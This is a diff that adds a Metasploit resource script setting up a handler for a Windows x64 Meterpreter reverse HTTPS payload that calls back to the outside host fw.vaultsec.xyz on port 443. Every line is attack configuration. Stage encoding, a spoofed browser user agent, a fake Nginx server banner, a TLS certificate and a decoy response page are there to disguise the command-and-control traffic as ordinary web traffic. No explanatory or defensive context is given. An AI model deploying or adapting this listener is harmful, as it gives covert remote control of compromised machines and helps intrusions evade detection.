@@ -1,0 +1,16 @@
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_winhttps
+set LHOST fw.vaultsec.xyz
+set LPORT 443
+set EXITFUNC thread
+set verbose true
+set EnableStageEncoding true
+set StageEncoder x64/xor_dynamic
+set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.42"
+set HttpServerName Nginx
+set HandlerSSLCert /etc/letsencrypt/live/fw.vaultsec.xyz/unified.pem
+set HttpUnknownRequestResponse "<html><body><h1>zzz</h1></body></html>"
+set HttpCookie "PHPSESS: 112391323913"
+set HttpReferer "https://fw.vaultsec.xyz/status?t=1aIIt2313"
+set ExitOnSession false
+exploit -j
